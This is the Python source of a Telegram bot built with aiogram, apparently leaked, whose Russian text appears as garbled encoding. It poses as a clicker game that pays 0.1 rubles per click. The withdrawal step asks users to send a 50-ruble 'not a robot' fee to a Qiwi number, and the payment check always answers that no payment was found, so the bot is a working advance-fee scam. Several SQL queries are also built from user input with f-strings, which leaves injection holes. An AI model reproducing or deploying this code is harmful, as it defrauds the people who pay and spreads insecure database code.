from aiogram import Bot, Dispatcher, executor, types #—Å–ª–∏—Ç–æ –≤ @smoke_software
from keyboard import *
import sqlite3
import datetime
import time
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import random
from aiogram.types import CallbackQuery
from config import *


bot = Bot(bot_token, parse_mode='html')
dp = Dispatcher(bot,storage = MemoryStorage())


class admad(StatesGroup):
    ad = State()
class reuser(StatesGroup):
    userad = State()


def get_now_date():
    date = datetime.datetime.today().strftime("%d.%m.%Y")
    return date

with sqlite3.connect("database.db") as conn:
  cursor = conn.cursor()
  cursor.execute("""
  CREATE TABLE IF NOT EXISTS Users
  (user_id INTEGER, balance TEXT, registration_date TEXT)
  """)


@dp.message_handler(commands=['start'])
async def start(message: types.Message):
	await bot.send_message(message.chat.id, "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –∫–ª–∏–∫–µ—Ä –±–æ—Ç", reply_markup=start_keyboard)
	cursor.execute("select * from users where user_id = ?",(message.from_user.id,))
	usr = cursor.fetchone()
	if not usr:
	       user_id = (message.from_user.id)
	       user = [user_id, 0, get_now_date()]
	       cursor.execute(f'''INSERT INTO users(user_id, balance, registration_date) VALUES(?,?,?)''', user)
	       conn.commit()


@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
	if message.from_user.id == admin_id:
		get_all_users = cursor.execute('SELECT Count(*) FROM users').fetchone()[0]
		get_all_today_users = cursor.execute(f"""SELECT Count(*) FROM users WHERE registration_date = '{get_now_date()}' """).fetchone()[0]
		await bot.send_message(message.chat.id, f"–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å:\n\n–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {get_all_users}\n–ù–æ–≤—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –∑–∞ —Å–µ–≥–æ–¥–Ω—è: {get_all_today_users}", reply_markup=admin_keyboard)


@dp.message_handler(content_types=['text'])
async def get_message(message):
    if message.text == "‚òòÔ∏è –ö–ª–∏–∫":
        cursor.execute(f'UPDATE users SET balance = balance + 0.1 WHERE user_id IS "{message.from_user.id}"')
        await bot.send_message(message.chat.id, text = "–í—ã –∫–ª–∏–∫–Ω—É–ª–∏ –∏ –ø–æ–ª—É—á–∏–ª–∏ 0.1‚ÇΩ –Ω–∞ —Å–≤–æ–π –±–∞–ª–∞–Ω—Å!")
    if message.text == "‚öôÔ∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞":
        await bot.send_message(message.chat.id, text = "üíª –ü–æ–¥–¥–µ—Ä–∂–∫–∞", reply_markup=ppp)
    if message.text == '‚ùå –í—ã–π—Ç–∏ –∏–∑ –∞–¥–º–∏–Ω–∫–∏':
        if message.chat.id == 5206676272:
        	await bot.send_message(message.chat.id,text = '–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é',reply_markup=start_keyboard)
    if message.text == "üìù –û –±–æ—Ç–µ":
    	get_all_users = cursor.execute('SELECT Count(*) FROM users').fetchone()[0]
    	get_all_today_users = cursor.execute(f"""SELECT Count(*) FROM users WHERE registration_date = '{get_now_date()}' """).fetchone()[0]
    	await bot.send_message(message.chat.id, text = f"<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞:</b>\n\nüñ±Ô∏è –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {get_all_users}\nüñ±Ô∏è –ù–æ–≤—ã—Ö –∑–∞ —Å–µ–≥–æ–¥–Ω—è: {get_all_today_users}\nüñ±Ô∏è –í—ã–≤–µ–¥–µ–Ω–æ: \nüñ±Ô∏è –°—Ç–∞—Ä—Ç –±–æ—Ç—ã –ø—Ä–æ–∏–∑–≤–µ–¥—ë–Ω: 21.10.2021\n\n‚ùó<i>–•–æ—Ç–∏–º —Å–æ–æ–±—â–∏—Ç—å –≤–∞–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–π –ø—Ä–æ–µ–∫—Ç —è–≤–ª—è–µ—Ç—Å—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ—Ä—É—á–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–æ–π –∏ –Ω–∏–∫–∞–∫ –Ω–µ –∏–º–µ–µ—Ç –æ—Ç–Ω–æ—à–µ–Ω–∏–µ –∫ —Å—Ö–æ–∂–∏–º –ø—Ä–æ–µ–∫—Ç–∞–º.</i>‚ùó", parse_mode='html')
    if message.text == '‚úâÔ∏è –†–∞—Å—Å—ã–ª–∫–∞':
      if message.chat.id == 5206676272:
      	await admad.ad.set()
      	await bot.send_message(message.chat.id, text = "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫c—Ç —Ä–∞—Å—Å—ã–ª–∫–∏")
    if message.text == 'üîç –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è':
      if message.chat.id == 5206676272:
      	await reuser.userad.set()
      	await bot.send_message(message.chat.id, text = "–í–≤–µ–¥–∏—Ç–µ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
    if message.text == "üë§ –ö–∞–±–∏–Ω–µ—Ç":
        balance = cursor.execute(f"SELECT balance FROM users WHERE user_id = {message.from_user.id}").fetchone()[0]
        regist = cursor.execute(f"""SELECT registration_date  FROM users WHERE user_id = {message.from_user.id}""").fetchone()[0]
        await bot.send_message(message.chat.id, text = f"""üñ±Ô∏è –ö–∞–±–∏–Ω–µ—Ç:\n\nüñ±Ô∏è –í–∞—à id: <code>{message.from_user.id}</code>\n\nüñ±Ô∏è –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: {regist}\n\nüñ±Ô∏è –õ–æ–≥–∏–Ω: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n\nüñ±Ô∏è –í–∞—à –±–∞–ª–∞–Ω—Å: {balance}\n\nüñ±Ô∏è –í—Å–µ–≥–æ –∑–∞—Ä–æ–±–æ—Ç–∞–Ω–æ: {balance}""", reply_markup=withdrawl)

@dp.callback_query_handler(lambda c: c.data)
async def anhs(call: CallbackQuery):
        if call.data == 'exi1t':
        	await call.message.delete()
        	await bot.send_message(call.message.chat.id,text = "‚ùå –ó–∞–∫—Ä—ã—Ç–æ!")
        if call.data == 'paych':
        	await bot.send_message(call.message.chat.id,text = "‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        if call.data == 'withdrawl1':
            price = 50
            comment = random.randint(1000, 99999)
            await bot.send_message(call.message.chat.id,text = f"–î–ª—è –≤—ã–≤–æ–¥–∞ –Ω—É–∂–Ω–æ –æ–ø–ª–∞—Ç–∏—Ç—å 50‚ÇΩ –Ω–∞ –Ω–∞—à –∫–∏–≤–∏ –∫–æ—à–µ–ª–µ–∫, –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n–ù–æ–º–µ—Ä –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞: <code>{phone}</code>\n–ö–æ–º–µ–Ω—Ç—Ä–∏–π –∫ –ø–µ—Ä–µ–≤–æ–¥—É: <code>{comment}</code>\n–°—É–º–º–∞ –∫ –ø–µ—Ä–µ–≤–æ–¥—É: {price}‚ÇΩ", reply_markup=check_pay_kb)



@dp.message_handler(state=admad.ad)
async def getcount(message: types.Message, state: FSMContext):
    ad = message.text
    await state.update_data(ad=ad)
    await state.finish()
    all_id = cursor.execute("SELECT user_id FROM users").fetchall()
    for id in all_id:
     for id in id:
      try:
       await bot.send_message(id,text = f"{ad}", parse_mode='html')
      except:
       pass  
    await bot.send_message(message.chat.id,text = '–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–∏–Ω–∞')



@dp.message_handler(state=reuser.userad)
async def getcount(message: types.Message, state: FSMContext):
    userad = message.text
    await state.update_data(userad=userad)
    balance_2 = cursor.execute(f"SELECT balance FROM users WHERE user_id = {userad}").fetchone()[0]
    status_2 = cursor.execute(f"SELECT status FROM users WHERE user_id = {userad}").fetchone()[0]
    regist_2 = cursor.execute(f"""SELECT registration_date  FROM users WHERE user_id = {userad}""").fetchone()[0]
    await message.answer(f"""–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ <a href="tg://user?id={message.text}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ</a>:\n\nüñ±Ô∏è ID: {message.text}\nüñ±Ô∏è –ò–º—è: <a href="tg://user?id={message.text}">{message.from_user.first_name}</a>\nüñ±Ô∏è –ë–∞–ª–∞–Ω—Å: {balance_2}\nüñ±Ô∏è –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: {regist_2}\nüñ±Ô∏è –°—Ç–∞—Ç—É—Å: {status_2}""", reply_markup=infouser)

#—Å–ª–∏—Ç–æ –≤ @smoke_software

if __name__ == '__main__':
    executor.start_polling(dp, fast=True, skip_updates=True)